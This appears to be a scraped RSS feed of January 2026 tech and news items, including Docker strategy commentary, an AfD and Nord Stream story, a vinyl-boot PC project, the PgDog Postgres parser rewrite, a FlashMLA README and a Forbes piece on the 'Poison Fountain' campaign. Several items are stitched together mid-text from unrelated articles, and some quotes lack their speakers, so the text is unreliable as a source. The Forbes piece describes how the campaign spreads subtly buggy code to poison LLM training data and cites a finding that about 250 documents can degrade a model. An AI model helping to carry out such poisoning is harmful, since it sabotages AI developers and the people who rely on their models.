Oracle Cloud Infrastructure founder and executive vice president. This leadership transition has prompted tech analysts to anticipate a potential acquisition by a major cloud provider. The CEO swap, combined with the strategic pivots, suggests Docker may be positioning itself for sale rather than building a standalone business.Docker’s strategic shifts tell a story of a company searching for its place in a market it helped create. The containerization technology Docker pioneered became so successful that it became infrastructure - something everyone uses but no one wants to pay for directly.The pivots from orchestration (Swarm) to developer tools (Scout, Testcontainers) to AI (Model Runner, MCP Defender) to security (Hardened Images) show a company trying different approaches to find sustainable revenue. Each pivot makes sense in isolation, but together they paint a picture of a company without a clear long-term vision.The hardened images move is particularly interesting because it’s defensive - responding to Chainguard’s success rather than leading with innovation. Making it free and open source is a strong competitive move, but it doesn’t solve the fundamental business model question.Docker the technology isn’t going anywhere. It’s too embedded in the infrastructure of modern software development. But Docker the company? That’s less clear. The leadership change, acquisition speculation, and rapid strategic pivots suggest Docker Inc may be positioning itself for an exit rather than building a long-term independent business.For developers, this doesn’t change much. Docker containers will continue to work, and the open source nature of Docker means the technology will persist regardless of what happens to the company. But it’s worth watching how Docker Inc’s search for identity plays out - it could affect the ecosystem of tools and services built around containers.The irony is that Docker created a standard so successful that it became infrastructure, and infrastructure is hard to monetize. Docker Inc’s struggle to find its place is a cautionary tale about the challenges of building a business around open source technology that becomes too successful.]]></content:encoded></item><item><title>Adana Türkiye Food tour Day 4 part 1</title><link>https://www.youtube.com/shorts/dup8kOp3o-U</link><author>Middle Eats</author><category>yt</category><enclosure url="https://www.youtube.com/v/dup8kOp3o-U?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 12:30:55 +0000</pubDate><source url="https://www.youtube.com/channel/UCWj_rUMGYCP0DjffybE2nbg">Middle Eats</source><content:encoded><![CDATA[Adana Türkiye Food tour Day 4 part 1

We cannot do what we do without your support.A senior figure from the far-right Alternative for Germany (AfD) has called for Poland to pay his country €1.3 billion (5.5 billion zloty) as reparations for its “complicity” in the sabotage of the Nord Stream gas pipelines.His demand – the latest in a recent series of anti-Polish remarks by AfD figures – has been met with anger in Poland, with one government minister calling it “outrageous”.On Wednesday, Kay Gottschalk, one of the founders of AfD and currently its parliamentary spokesman for financial affairs, responded on social media platform X to a post by Dominik Tarczyński, an MEP for Poland’s national-conservative Law and Justice (PiS) party.Tarczyński, a strong supporter of Donald Trump, celebrated that “Germany today got a slap in the face from Republican forces”. The context of his message was not made clear, but it may have been a reference to Trump’s threat to place tariffs on Germany in relation to the Greenland crisis.Gottschalk then wrote: “€AfD has no immediate prospect of coming to power, with elections not due until 2029. But it is the largest opposition party in the Bundestag, Germany’s parliament, and, according to polling averages, is also currently the most popular party among voters, with support of around 26%.Gottschalk’s reference to Nord Stream concerns the 2022 operation that saw explosives used to damage pipelines in the Baltic Sea that brought Russian gas to Germany, rendering them inoperable (though they were not functioning at that moment in any case, following Russia’s full-scale invasion of Ukraine).Poland had long criticised Germany over the pipelines, arguing that they helped fund Russia’s war machine and harmed Polish and Ukrainian interests. Many in Poland welcomed the sabotage that damaged Nord Stream. However, there is no evidence that Poland itself was complicit.Last year, at Germany’s request, the Polish authorities detained a Ukrainian man, Volodymyr Zhuravlov, accused by German prosecutors of involvement in the sabotage operation. But a Polish court rejected a request to extradite him, a decision praised by figures in both Poland’s government and opposition.Some in Germany condemned Poland for its support of Zhuravlov and refusal to extradite him. Such criticism came in particular from the AfD, which has long been accused of having sympathies towards and connections with Russia.Gottschalk himself at the time accused the Polish state of “being an accomplice to terrorists”. AfD’s co-leader Tino Chrupalla declared that Poland was as great a threat to Germany as Russia and, as an example, pointed to the decision “not to extradite a terrorist to Germany”.Meanwhile, Gottschalk’s use of the term “reparations” and his demand for €1.3 billion in his tweet this week was likely a reference to another area of tension between Poland and Germany.Gottschalk’s latest remarks prompted anger in Poland. Speaking to broadcaster Polsat, Agnieszka Dziemianowicz-Bąk, the labour minister and a member of The Left (Lewica), called them “absolutely outrageous words”.“The Germans claimed [Nord Stream] was a business project, not a political one. If [so], then it should have been insured, instead of complaining now and fantasising about compensation (because that’s probably what they were after, not reparations),” wrote Bosak.In November last year, a local AfD activist, Fabian Keubel, also prompted widespread anger in Poland by calling Poles “the African Americans of Europe” because they “see themselves as the great, pitiable, perennial victim of European history”.

Boring! Why don’t we try to boot from a record player for a change?: Click here to observe the very same vinyl ramdisk booted on an IBM PCjr!
So this nutty little experiment connects a PC, or an IBM PC to be exact, directly onto a record player through an amplifier. I made a small ROM on-chip boot loader that operates the built-in “cassette interface” of the PC (that was hardly ever used), which will now be invoked by the BIOS if all the other boot options fail, i.e. floppy disk and the hard drive. The turntable spins an analog recording of a small bootable read-only RAM drive, which is 64K in size. This contains a FreeDOS kernel, modified by me to cram it into the memory constraint, a micro variant of COMMAND.COM and a patched version of INTERLNK, that allows file transfer through a printer cable, modified to be runnable on FreeDOS. The bootloader reads the disk image from the audio recording through the cassette modem, loads it to memory and boots the system on it. Simple huh?And now to get more technical: this is basically a merge between BootLPT/86 and 5150CAXX, minus the printer port support. It also resides in a ROM, in the BIOS expansion socket, but it does not have to. The connecting cable between the PC and the record player amplifier is the same as with 5150CAXX, just without the line-in (PC data out) jack.
The “cassette interface” itself is just PC speaker timer channel 2 for the output, and 8255A-5 PPI port C channel 4 (PC4, I/O port 62h bit 4) for the input. BIOS INT 15h routines are used for software (de)modulation.
The boot image is the same 64K BOOTDISK.IMG “example” RAM drive that can be downloaded at the bottom of the BootLPT article. This has been turned into an “IBM cassette tape”-protocol compliant audio signal using 5150CAXX, and sent straight to a record cutting lathe.
Vinyls are cut with an RIAA equalization curve that a preamp usually reverses during playback, but not perfectly. So some signal correction had to be applied from the amplifier, as I couldn’t make it work right with the line output straight from the phono preamp. In my case, involving a vintage Harman&Kardon 6300 amplifier with an integrated MM phono preamp, I had to fade the treble all the way down to -10dB/10kHz, increase bass equalization to approx. +6dB/50Hz and reduce the volume level to approximately 0.7 volts peak, so it doesn’t distort. All this, naturally, with any phase and loudness correction turned off.
Of course, the cassette modem does not give a hoot in hell about where the signal is coming from. Notwithstanding, the recording needs to be pristine and contain no pops or loud crackles (vinyl) or modulation/frequency drop-outs (tape) that will break the data stream from continuing. However, some wow is tolerated, and the speed can be 2 or 3 percent higher or lower too.And that’s it! For those interested, the bootloader binary designed for a 2364 chip (2764s can be used, through an adaptor), can be obtained here. It assumes an IBM 5150 with a monochrome screen and at least 512K of RAM, which kind of reminds me of my setup (what a coincidence). The boot disk image can be obtained at the bottom of the BootLPT/86 article, and here’s its analog variant, straight from the grooves 🙂]]></content:encoded></item><item><title>I don’t think using AI for surveillance of kids in school is a good idea</title><link>https://www.reddit.com/r/artificial/comments/1qknhjn/i_dont_think_using_ai_for_surveillance_of_kids_in/</link><author>/u/No_Turnip_1023</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 10:37:02 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[There's this post on Linkedin, where they demonstarte an "experiment".

[...] "Total sitting time has been shown to be related to brain health; however, sitting is often treated as a single entity, without considering the specific type of activity," explains public health researcher Paul Gardiner from the University of Queensland in Australia. "Most people spend many hours sitting each day, so the type of sitting really matters ... These findings show that small everyday choices -- like reading instead of watching television -- may help keep your brain healthier as you age."
 
Across numerous studies, Gardiner and colleagues found that active sitting activities, like reading, playing card games, and using a computer, showed "overwhelmingly positive associations with cognitive health, enhancing cognitive functions such as executive function, situational memory, and working memory." Meanwhile, passive sitting was most consistently associated with negative cognitive outcomes, including increased risk of dementia. The study was published in the Journal of Alzheimer's Disease.]]></content:encoded></item><item><title>CKB — A code intelligence server written in Go (SCIP-based, 80+ query tools via MCP)</title><link>https://www.reddit.com/r/golang/comments/1qkmug3/ckb_a_code_intelligence_server_written_in_go/</link><author>/u/Maleficent-Sun9141</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 09:58:34 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I built CKB in Go — it indexes your codebase using SCIP and exposes 80+ code intelligence queries through CLI, HTTP API, and MCP (Model Context Protocol for AI assistants).CKB turns your repo into a queryable knowledge base.

Under the hood, we use  to parse and understand SQL queries. Since PgDog is written in Rust, we use its Rust bindings to interface with the core C library. 
Those bindings use Protobuf (de)serialization to work uniformly across different programming languages, e.g., the popular Ruby  gem.Protobuf is fast, but not using Protobuf is faster. We forked  and replaced Protobuf with direct C-to-Rust (and back to C) bindings, using bindgen and Claude-generated wrappers. This resulted in a 5x improvement in parsing queries, and a 10x improvement in deparsing (Postgres AST to SQL string conversion).You can reproduce these by cloning our fork and running the benchmark tests: (Protobuf) (Direct C to Rust) (Protobuf) (Direct Rust to C)The first step is always profiling. We use samply, which integrates nicely with the Firefox profiler. Samply is a sampling profiler: it measures how much time code spends running CPU instructions in each function. It works by inspecting the application call stack thousands of times per second. The more time is spent inside a particular function (or span, as they are typically called), the slower that code is. This is how we discovered :This is the entrypoint to the  C library, used by all  bindings. The function that wraps the actual Postgres parser, , barely registered on the flame graph. Parsing queries isn’t free, but the Postgres parser itself is very quick and has been optimized for a long time. With the hot spot identified, our first instinct was to do nothing and just add a cache.Caching is a trade-off between memory and CPU utilization, and memory is relatively cheap (latest DRAM crunch notwithstanding). The cache is mutex-protected, uses the LRU algorithm and is backed by a hashmap. The query text is the key and the Abstract Syntax Tree is the value, which expects most apps to use prepared statements. The query text contains placeholders instead of actual values and is therefore reusable, for example:While the  parameter can change between invocations, the prepared statement does not, so we could cache its static AST in memory.This works pretty well, but eventually we ran into a couple of issues:Some ORMs can have bugs that generate thousands of unique statements, e.g.,  instead of , which causes a lot of cache missesApplications use old PostgreSQL client drivers which don’t support prepared statements, e.g., Python’s  packageThe clock on Protobuf was ticking and we needed to act. So, like a lot of engineers these days, we asked an LLM to just do it for us.I’m going to preface this section by saying that the vast majority of PgDog’s source code is written by a human. AI is not in a position to one-shot a connection pooler, load balancer and database sharder. However, when scoped to a very specific, well-defined and most importantly  task, it can work really well.The prompt we started with was pretty straightforward:libpg_query is a library that wraps the PostgreSQL parser in an API. pg_query.rs is a Rust wrapper around libpg_query which uses Protobuf for (de)serialization. Replace Protobuf with bindgen-generated Rust structs that map directly to the Postgres AST.And after two days of back and forth between us and the machine, it worked. We ended up with 6,000 lines of recursive Rust that manually mapped C types and structs to Rust structs, and vice versa. We made the switch for ,  (used in our new query rewrite engine, which we’ll talk about in another post),  and . These four methods are heavily used in PgDog to make sharding work, and we immediately saw a 25% improvement in  benchmarks.Just to be clear: we had a lot of things going for us already that made this possible. First,  has a Protobuf spec for  (and Prost, the Protobuf Rust implementation) to generate bindings, so Claude was able to get a comprehensive list of structs it needed to extract from C, along with the expected data types.Second,  was already using bindgen, so we had to just copy/paste some invocations around to get the AST structs included in bindgen’s output.And last, and definitely not least,  already had a working  and  implementation, so we could test our AI-generated code against its output. This was entirely automated and verifiable: for each test case that used , we included a call to , compared their results and if they differed by even one byte, Claude Code had to go back and try again.The translation code between Rust and C uses  Rust functions that wrap Rust structs to C structs. The C structs are then passed to the Postgres/ C API which does the actual work of building the AST.The result is converted back to Rust using a recursive algorithm: each node in the AST has its own converter function which accepts an  C pointer and returns a safe Rust struct. Much like the name suggests, the AST is a tree, which is stored in an array:For each node in the list, the implementation calls , which then handles each one of the 100s of tokens available in the SQL grammar:For nodes that contain other nodes, we recurse on  again until the algorithm reaches the leaves (nodes with no children) and terminates. For nodes that contain scalars, like a number (e.g., ) or text (e.g., ), the data type is copied into a Rust analog, e.g.,  or .The end result is , a Rust struct generated by Prost from the  API Protobuf specification, but populated by native Rust code instead of Prost’s deserializer. Reusing existing structs reduces the chance of errors considerably: we can compare  and  outputs, using the derived  trait, and ensure that both are identical, in testing.While recursive algorithms have a questionable reputation in the industry because bad ones can cause stack overflows, they are very fast. Recursion requires no additional memory allocation because all of its working space, the stack, is created on program startup. It also has excellent CPU cache locality because the instructions for the next invocation of the same function are already in the CPU L1/L2/L3 cache. Finally and arguably more importantly, they are just easier to read and understand than iterative implementations, which helps us, the humans, with debugging.Just for good measure, we tried generating an iterative algorithm, but it ended up being slower than Prost. The main cause (we think) was unnecessary memory allocations, hashmap lookups of previously converted nodes, and too much overhead from walking the tree several times. Meanwhile, recursion processes each AST node exactly once and uses the stack pointer to track its position in the tree. If you have any ideas on how to make an iterative algorithm work better, let us know!Reducing the overhead from using the Postgres parser in PgDog makes a huge difference for us. As a network proxy, our budget for latency, memory utilization, and CPU cycles is low. After all, we aren’t a real database…yet! This change improves performance from two angles: we use less CPU and we do less work, so PgDog is faster and cheaper to run.If stuff like this is interesting to you, reach out. We are looking for a Founding Software Engineer to help us grow and build the next iteration of horizontal scaling for PostgreSQL.]]></content:encoded></item><item><title>How Circular Deals Are Driving the AI Boom</title><link>https://www.youtube.com/watch?v=9yy_Wz0BbyU</link><author>Bloomberg Originals</author><category>yt</category><enclosure url="https://www.youtube.com/v/9yy_Wz0BbyU?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 09:00:12 +0000</pubDate><source url="https://www.youtube.com/channel/UCUMZ7gohGI9HcU9VNsr2FJQ">Bloomberg Originals</source><content:encoded><![CDATA[The AI boom is everywhere, but much of it is illusory, with money flowing between a few players who have yet to profit.

I’m wanting to replicate identical data across drives in my cluster for high availability and redundancy. What would be the best way to handle this? All three are equipped with a i5-7500, 32Gi RAM, 256 NVMe drive, a 1T SATA SSD intended to be the replicated disk, and connected to a 1Gbe switch as they don’t have any faster NICs installed. I’ve looked into Longhorn and Ceph but both highly recommend 10Gbe but tha is not possible for me.

"You have this conflict between individual incentives and science as a whole," says James Evans, a sociologist at the University of Chicago who led the study. From a recent IEEE Spectrum article: To quantify the effect, Evans and collaborators from the Beijing National Research Center for Information Science and Technology trained a natural language processing model to identify AI-augmented research across six natural science disciplines. Their dataset included 41.3 million English-language papers published between 1980 and 2025 in biology, chemistry, physics, medicine, materials science, and geology. They excluded fields such as computer science and mathematics that focus on developing AI methods themselves. The researchers traced the careers of individual scientists, examined how their papers accumulated attention, and zoomed out to consider how entire fields clustered or dispersed intellectually over time. They compared roughly 311,000 papers that incorporated AI in some way -- through the use of neural networks or large language models, for example -- with millions of others that did not.
 
The results revealed a striking trade-off. Scientists who adopt AI gain productivity and visibility: On average, they publish three times as many papers, receive nearly five times as many citations, and become team leaders a year or two earlier than those who do not. But when those papers are mapped in a high-dimensional "knowledge space," AI-heavy research occupies a smaller intellectual footprint, clusters more tightly around popular, data-rich problems, and generates weaker networks of follow-on engagement between studies. The pattern held across decades of AI development, spanning early machine learning, the rise of deep learning, and the current wave of generative AI. "If anything," Evans notes, "it's intensifying." [...] Aside from recent publishing distortions, Evans's analysis suggests that AI is largely automating the most tractable parts of science rather than expanding its frontiers.]]></content:encoded></item><item><title>India Is Turning Trump’s Trade Pressure Into Opportunity</title><link>https://www.youtube.com/watch?v=FeG3he0CyrQ</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/FeG3he0CyrQ?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 06:52:07 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[As U.S.-EU tensions reshape global alliances, India faces both risks and rewards.

She is famous now for saying "let them eat cake", for her love of fashion, and her supposedly extravagant spending at a time when ordinary people in France were going hungry. But how true are any of these stories, and where did these myths about her originate?In this episode, we look at Marie Antoinette’s Austrian childhood and overbearing mother, her marriage to Louis XVI and time as queen of France, and the hatred directed at her by the revolutionaries. Along the way we take in her involvement in politics, her love of the theatre, and her possible Swedish sweetheart.This is a radio edit of the original podcast episode.

The Patriots then famously fell on their collective face against the Giants, making the season very much  perfect. But the team went ahead and got the mark anyway. Add to that my take that this kind of phrase for the categories of sports apparel and the like is not nearly unique enough to serve as a valid mark to begin with and we have a situation practically begging to get absurd.And the absurdity may have arrived. For you non-sports fans in the audience, the Indiana University Hoosiers just won the College Football National Championship without losing a single game during the season. IU, in stark contrast to the Patriots, in fact have a perfect season. But if they, or anyone else, would like to celebrate that fact, they would need to license the use of the term from the Patriots to do so.Not only did The Kraft Group continue, they licensed the mark to the Massachusetts Interscholastic Athletic Association for use in a DVD in order to satisfy the “use in commerce” stipulation by the U.S. Patent & Trademark Office and, in 2016, the team was granted rights to the trademarks.Unlike Pat Riley, who filed to trademark “Three Peat” when he was the coach of the Lakers and then cashed in when the Chicago Bulls and New York Yankees won three straight titles, The Kraft Group’s trademark hasn’t had many opportunities to gain royalties from the mark.But Kraft  demonstrate it has used the term in commerce via its previous licensing agreements. That puts IU and/or apparel companies in the position to go one of three routes. They can license the term for apparel from Kraft, thereby perpetuating this entire silly enterprise, they can license the phrase and potentially fight a court battle to invalidate the trademark after they make the products and are sued or threatened by Kraft, or they can just not use the phrase at all.The latter appears to be the most likely route.Items in Indiana’s team store use the word “Perfection.” Homefield Apparel, whose original school is Indiana, uses “Perfect” without “Season” on its shirts.Even that is absurd. Again, the end result, thanks to a USPTO all too happy to approve trademarks that it probably shouldn’t, is that a team that achieved a perfect season cannot freely use the phrase that correctly describes its own accomplishment because it would have to license it from a team that didn’t. ]]></content:encoded></item><item><title>Talking to LLMs has improved my thinking</title><link>https://philipotoole.com/why-talking-to-llms-has-improved-my-thinking/</link><author>otoolep</author><category>hn</category><pubDate>Fri, 23 Jan 2026 03:52:06 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[I’ve been surprised by – and enjoy – one aspect of using large language models more than any other.They often put into words things I have long understood, but could not write down clearly. When that happens, it feels less like learning something new and more like recognition. A kind of “ok, yeah” moment.I have not seen this effect discussed much. I also think it has improved how .Much of what we know is tacitYou know when a design is wrong before you can say why. You sense a bug before you can reproduce it. You recognize a bad abstraction instantly, even if it takes an hour to explain the problem to someone else.This is not a failure. It is how experience operates. The brain compresses experience into patterns that are efficient for action, not for speech. Those patterns are real, but they are not stored in sentences.The problem is that reflection, planning, and teaching all require language. If you cannot express an idea, you cannot easily examine it, you cannot easily share it.LLMs are good at the opposite problemLarge language models are built to do exactly this – turn vague structure into words.When I ask a question about something semi-obvious to me, something I believe is true but am not sure why, the model responds with a formulation. It steps through each reason why that something may be true. Each point it makes is orthogonal to the previous one, allowing me to trade, exchange, and re-order the arguments it makes.Putting things into words changes the thoughtOnce the LLM writes down an idea, I can then play with it in my mind.Vague intuitions turn into named distinctions and my implicit assumptions become visible. At that point I can test them, discard them, or refine them.Of course, this is not new. Writing has always done this for me. What is different is the speed. I can explore half-formed thoughts, discard bad descriptions, and try again. That encourages a kind of thinking I might have otherwise skipped.The feedback loop mattersOver time I’ve noticed that now I do this without an LLM to hand.  Can I “phrase in precise language what and why I am thinking, feeling, believing, right now?”In that sense, the model is not improving my thinking directly. It is improving how I use language, improving the effectiveness of my internal monologue. And since reasoning depends heavily on what one can represent explicitly, that improvement can feel like a real increase in clarity.The more I do this, the better I get at noticing what I actually think.]]></content:encoded></item><item><title>Underground Resistance Aims To Sabotage AI With Poisoned Data</title><link>https://www.forbes.com/sites/craigsmith/2026/01/21/poison-fountain-and-the-rise-of-an-underground-resistance-to-ai/</link><author>/u/RNSAFFN</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 03:34:19 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The Luddites are back, wrecking technology in a quixotic effort to stop progress. This time, though, it’s not angry textile workers destroying mechanized looms, but a shadowy group of technologists who want to stop the progress of artificial intelligence.Poison Fountain, as their project is called, is intended to trigger a techno-uprising complete with a manifesto and sabotage instructions on a public-facing website. Its premise is simple: If modern AI systems depend on internet data, then the most direct way to slow them down is to contaminate that data at the source.The project’s launch lands amid growing anxiety about AI safety, fueled in part by warnings from people like Geoffrey Hinton, the Nobel Prize-winning researcher often called the “godfather of AI” for his foundational work in neural networks. In 2023, after leaving Google, Hinton publicly argued that advanced AI could pose existential dangers to mankind and that society should treat the risks as urgent. He continues to beat that drum.“We agree with Geoffrey Hinton: machine intelligence is a threat to the human species,” the Poison Fountain’s rudimentary website reads. “We want to inflict damage on machine intelligence systems.”Throughout history, disruptive technologies have often provoked violent backlashes. Beyond the Luddites, rioters destroyed threshing machines in 1830, Welsh protesters tore down turnpike tollgates in the 1840s. More recently, French taxi drivers attacked Uber vehicles in 2015, and arson attacks have plagued 5G cellphone towers in the 2020s.While each movement ultimately failed to halt progress, new technologies concentrate wealth among capital owners while distributing the economic pain they cause among a less empowered populace. With AI, technological resistance is likely to become chronic when the perceived threat is to human life itself, rather than simply livelihoods.What Poison Fountain Is Trying To DoLarge language models are the text-generating systems behind many chatbots and the latest AI systems that can reason, make decisions and take action. LLMs are trained by ingesting enormous collections of text and code from the internet. The industry term for the automated programs that collect this material from websites is “web crawlers.” Those crawlers copy webpage content at scale, then AI companies filter and package it into training datasets, the vast repositories that LLMs learn from.Poison Fountain’s strategy is to trick those crawlers into collecting “poisoned” content designed to degrade a model during training. The group is calling on like-minded website operators to embed links that point to streams of poisoned training data. The poisoned material includes incorrect code with subtle logic errors and bugs intended to damage models trained on it.Poison Fountain lists two URLs: one on the regular web and a second hosted in the dark web, which is typically harder to remove via conventional takedowns.Why The ‘Small Poison’ Idea Suddenly Looks PlausibleRecent research suggests Poison Fountain may not need to corrupt much training data to cause measurable harm in LLM performance. In October 2025, Anthropic, working with the U.K. AI Security Institute and the Alan Turing Institute, published results that challenged a widespread assumption that poisoning a large model would require poisoning a huge fraction of its training data. Instead, the researchers found that even a small number of malicious documents could hurt model performance.In Anthropic’s experiments, as few as 250 malicious documents were enough to induce AI models to output gibberish. If 250 documents can do it, then poisoning becomes a serious threat to models trained with text found on the internet.The Gap Between A Demo And A Real-World WeaponPoison Fountain is attempting to operationalize the principle by distributing poisoned content through willing website operators. But there are at least three reasons to be cautious about claims that it will ruin billions of dollars in AI investment.First, training pipelines are not naive vacuums. Large AI developers already invest heavily in data cleaning: deduplication, filtering, quality scoring and removing obvious junk. Poison Fountain’s approach appears to include high volumes of flawed code and text, which may be easier to detect than the more carefully constructed poisoning examples used in academic papers.Second, the internet is vast. Even if many sites embed Poison Fountain’s links, the poisoned material still has to be sampled into a specific training run, survive filtering and appear often enough in the training stream to matter. Third, defenders can react. Once specific poisoning sources are known, they can be blacklisted at the URL, domain and pattern level. What This Episode Reveals About AI’s Weak LinkEven if Poison Fountain fizzles, it highlights a structural vulnerability in LLMs. Training data for the models is often a messy patchwork assembled from millions of sources, much of it scraped from the open web. If AI companies cannot trust the inputs, they cannot fully trust the outputs.Poison Fountain is, in effect, a protest. More than anything, it signals the opening move in a cat-and-mouse game that will likely widen and grow more sophisticated as AI becomes increasingly embedded in daily life. It is hard not to hear an echo of , where an underground resistance tries to sabotage an all-encompassing technical system. Whether you cheer for the rebels or the researchers, the deeper point is the same: we may be drifting into a future where disputes over AI shift from arguments to actions that target the technology itself.]]></content:encoded></item><item><title>deepseek-ai/FlashMLA</title><link>https://github.com/deepseek-ai/FlashMLA</link><author></author><pubDate>Fri, 23 Jan 2026 02:46:01 +0000</pubDate><source url="http://mshibanami.github.io/GitHubTrendingRSS">Github Trending</source><content:encoded><![CDATA[FlashMLA: Efficient Multi-head Latent Attention KernelsFlashMLA is DeepSeek's library of optimized attention kernels, powering the DeepSeek-V3 and DeepSeek-V3.2-Exp models.

pip install -v .
To use the MLA decoding kernels, call get_mla_metadata once before the decoding loop to get the tile scheduler metadata. Then, call flash_mla_with_kvcache in each decoding step. For example:from flash_mla import get_mla_metadata, flash_mla_with_kvcache

tile_scheduler_metadata, num_splits = get_mla_metadata(
    cache_seqlens,
    s_q * h_q // h_kv,
    h_kv,
    h_q,
    is_fp8,
    topk,
)

for i in range(num_layers):
    ...
    o_i, lse_i = flash_mla_with_kvcache(
        q_i, kvcache_i, block_table, cache_seqlens, dv,
        tile_scheduler_metadata, num_splits,
        is_causal, is_fp8_kvcache, indices,
    )
    ...
 is the number of q tokens per q sequence. If MTP (speculative decoding) is disabled, it should be 1. is the number of key-value heads. is the number of query heads. If  is set to , the kernel reads the KV cache in the "FP8 with scale" format (described below). It dequantizes the cache to bfloat16 and performs attention computation in bfloat16. The output is also in bfloat16.In the "FP8 with scale" format, each token's KV cache is 656 Bytes, structured as: The "quantized NoPE" part, containing 512  values. Scale factors, containing 4  values. The first  is the scale for the first 128  values, the second for the next 128, and so on. The "RoPE" part, containing 64  values. This part is not quantized for accuracy.See  for quantization and dequantization details.Sparse Attention ( tensor): The  tensor (if provided) enables token-level sparse attention by instructing the kernel to compute attention only for specified tokens. should be a 3D tensor of shape (batch_size, seq_len_q, topk).indices_in_kvcache[i][j][k] = (the index of the page block where token t resides) * page_block_size + (the offset of token t within the page block), where  is the k-th token for the j-th query sequence in the i-th batch. Since the index of the page block has already been encoded into , the kernel does not require the  parameter. Set invalid indices to . The kernel returns , where: is the attention result. is the log-sum-exp value of the attention scores for each query head.See tests/test_flash_mla_decoding.py for a complete example.For the sparse MLA prefill kernel, call  directly with the following parameters:: Query tensor of shape : Key-Value tensor of shape : Indices tensor of shape  This kernel does not support a batch dimension. For multi-batch inference, reshape the input tensors and adjust the  parameter to simulate batch processing. Set invalid entries in  to  or any number .Return Values and Equivalent PyTorch Code: The kernel returns . This is equivalent to the following PyTorch operations:Q: [s_q, h_q, d_qk], bfloat16
kv: [s_kv, h_kv, d_qk], bfloat16
indices: [s_q, h_kv, topk], int32

kv = kv.squeeze(1)  # [s_kv, d_qk], h_kv must be 1
indices = indices.squeeze(1)    # [s_q, topk]
focused_kv = kv[indices]    # For the i-th sequence (s_q), the corresponding KV tokens are selected from the KV cache based on indices[i, :]. This operation results in a tensor of shape [s_q, topk, d_qk].

P = (Q @ focused_kv.transpose(-1, -2)) * sm_scale * math.log2(math.e)    # [s_q, h_q, topk]
max_logits = P.max(dim=-1) # [s_q, h_q]
lse = log2sumexp2(P, dim=-1, base=2)   # [s_q, h_q]，"log2sumexp2" means that the exponentiation and logarithm are base-2
S = exp2(P - lse)      # [s_q, h_q, topk]
out = S @ focused_kv  # [s_q, h_q, d_qk]

Mastra integrates with frontend and backend frameworks like React, Next.js, and Node, or you can deploy it anywhere as a standalone server. It's the easiest way to build, tune, and scale reliable AI products.Purpose-built for TypeScript and designed around established AI patterns, Mastra gives you everything you need to build great AI applications out-of-the-box. - Connect to 40+ providers through one standard interface. Use models from OpenAI, Anthropic, Gemini, and more. - Build autonomous agents that use LLMs and tools to solve open-ended tasks. Agents reason about goals, decide which tools to use, and iterate internally until the model emits a final answer or an optional stopping condition is met. - When you need explicit control over execution, use Mastra's graph-based workflow engine to orchestrate complex multi-step processes. Mastra workflows use an intuitive syntax for control flow (, , ). - Suspend an agent or workflow and await user input or approval before resuming. Mastra uses storage to remember execution state, so you can pause indefinitely and resume where you left off. - Give your agents the right context at the right time. Provide conversation history, retrieve data from your sources (APIs, databases, files), and add human-like working and semantic memory so your agents behave coherently. - Bundle agents and workflows into existing React, Next.js, or Node.js apps, or ship them as standalone endpoints. When building UIs, integrate with agentic libraries like Vercel's AI SDK UI and CopilotKit to bring your AI assistant to life on the web. - Author Model Context Protocol servers, exposing agents, tools, and other structured resources via the MCP interface. These can then be accessed by any system or agent that supports the protocol. - Shipping reliable agents takes ongoing insight, evaluation, and iteration. With built-in evals and observability, Mastra gives you the tools to observe, measure, and refine continuously.The  way to get started with Mastra is by running the command below:Looking to contribute?

Armstrong was one of three people arrested on Thursday in connection to a demonstration that disrupted church services in St Paul, Minnesota, on Sunday. Demonstrators alleged that one of the pastors, David Easterwood, was the acting field director of the St Paul Immigration and Customs Enforcement (ICE) office. Bondi announced the arrests on social media on Thursday morning.The homeland security secretary, Kristi Noem, posted an image of Armstrong’s arrest at 10.21am on Thursday, less than an hour after Bondi’s announcement. The image shows a law enforcement agent, face blurred out, escorting Armstrong, who appears to be handcuffed. Armstrong, dressed in all black, appears to be composed in the picture.A little more than 30 minutes later, the White House posted another image of Armstrong’s arrest in which she is crying. The White House press secretary, Karoline Leavitt, reposted the image. The image posted by the White House is altered, a Guardian analysis found.The Guardian overlaid the White House photo with the Noem photo and found that the law enforcement agents in both pictures line up exactly, confirming they are the same image. There are other similarities between the photos. An unidentified person can be seen in the same place behind the arresting agent. And the arresting agent’s arm appears to be behind Armstrong’s back in exactly the same position.Asked whether the image had been digitally altered, the White House responded by sending a post on X from Kaelan Dorr, the deputy communications director.“YET AGAIN to the people who feel the need to reflexively defend perpetrators of heinous crimes in our country I share with you this message: Enforcement of the law will continue. The memes will continue. Thank you for your attention to this matter,” he said.The White House X account, which has around 3.5 million followers, has made at least 14 posts with AI since the start of Trump’s second term, Poynter reported in October.Julius Constantine Motal and David McCoy contributed reporting]]></content:encoded></item><item><title>The Rust GCC backend can now be installed with rustup</title><link>https://www.reddit.com/r/rust/comments/1qk9t1t/the_rust_gcc_backend_can_now_be_installed_with/</link><author>/u/imperioland</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 23:06:07 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Starting tomorrow (23rd of January 2026), you will be able (on linux without cross-compilation) to install and use the Rust GCC backend directly from rustup!

